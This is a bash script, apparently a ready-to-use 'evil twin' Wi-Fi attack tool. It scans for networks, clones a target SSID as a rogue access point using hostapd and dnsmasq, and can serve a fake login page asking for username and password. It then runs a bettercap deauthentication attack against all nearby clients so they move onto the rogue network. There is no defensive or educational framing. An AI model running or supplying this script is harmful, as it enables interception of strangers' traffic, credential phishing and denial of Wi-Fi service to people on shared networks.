#!/bin/bash

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo -e "\e[1;31m[!] Run as root: sudo ./evil_twin_attacker.sh\e[0m"
    exit 1
fi

# Banner
echo -e "\e[1;34m"
echo "   _____      __      ____  __________"
echo "  / __/ | /| / /___  / __ \/_  __/ __ \ "
echo " / _/ | |/ |/ / __ \/ / / / / / / /_/ /"
echo "/___/ |__/|__/_/ /_/_/ /_/ /_/ \____/ "
echo -e "\e[0m"

# Check dependencies
if ! command -v bettercap &> /dev/null; then
    echo -e "\e[1;33m[+] Installing Bettercap...\e[0m"
    sudo apt update && sudo apt install -y bettercap
fi

if ! command -v hostapd &> /dev/null; then
    echo -e "\e[1;33m[+] Installing hostapd...\e[0m"
    sudo apt install -y hostapd dnsmasq
fi

# Kill interfering processes
sudo airmon-ng check kill &> /dev/null

# Menu
echo -e "\e[1;36m"
echo "1) Scan for Wi-Fi Networks"
echo "2) Launch Evil Twin Attack"
echo "3) Exit"
echo -e "\e[0m"

read -p "Select an option (1-3): " choice

case $choice in
    1)
        # Scan Wi-Fi networks
        read -p "Enter Wi-Fi interface (e.g., wlan0): " iface
        echo -e "\e[1;32m[*] Scanning networks (Ctrl+C to stop)...\e[0m"
        sudo bettercap -iface $iface -eval "wifi.recon on; wifi.show; pause"
        ;;
    2)
        # Evil Twin Attack
        read -p "Enter Wi-Fi interface (e.g., wlan0): " iface
        read -p "Enter target SSID (e.g., 'CoffeeShopWiFi'): " ssid
        read -p "Enter fake AP channel (e.g., 6): " channel
        read -p "Enable captive portal? (y/n): " captive

        echo -e "\e[1;32m[*] Setting up Evil Twin on $ssid...\e[0m"

        # Configure hostapd (fake AP)
        cat > /tmp/hostapd.conf <<EOF
interface=${iface}
driver=nl80211
ssid=${ssid}
hw_mode=g
channel=${channel}
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

        # Configure dnsmasq (DHCP/DNS)
        cat > /tmp/dnsmasq.conf <<EOF
interface=${iface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,24h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
EOF

        # Start Evil Twin
        sudo ifconfig $iface up 192.168.1.1 netmask 255.255.255.0
        sudo dnsmasq -C /tmp/dnsmasq.conf
        sudo hostapd /tmp/hostapd.conf &> /tmp/hostapd.log &

        # Optional: Captive Portal (simple example)
        if [[ "$captive" == "y" ]]; then
            echo -e "\e[1;33m[+] Starting captive portal (http://192.168.1.1)\e[0m"
            mkdir -p /tmp/www
            echo "<h1>Login Required</h1><form action='#' method='post'><input type='text' name='user' placeholder='Username'><input type='password' name='pass' placeholder='Password'><input type='submit' value='Login'></form>" > /tmp/www/index.html
            sudo python3 -m http.server 80 -d /tmp/www &> /dev/null &
        fi

        # Deauth clients to force reconnection
        echo -e "\e[1;31m[!] Launching deauth attack (Ctrl+C to stop)\e[0m"
        sudo bettercap -iface $iface -eval "wifi.recon on; set wifi.deauth.target *; wifi.deauth on"

        ;;
    3)
        echo -e "\e[1;33m[+] Exiting...\e[0m"
        exit 0
        ;;
    *)
        echo -e "\e[1;31m[!] Invalid option\e[0m"
        exit 1
        ;;
esac

# Cleanup on exit (Ctrl+C)
trap 'cleanup' INT
cleanup() {
    echo -e "\e[1;33m[+] Cleaning up...\e[0m"
    sudo pkill hostapd
    sudo pkill dnsmasq
    sudo pkill python3
    sudo airmon-ng stop $iface &> /dev/null
    exit 0
}
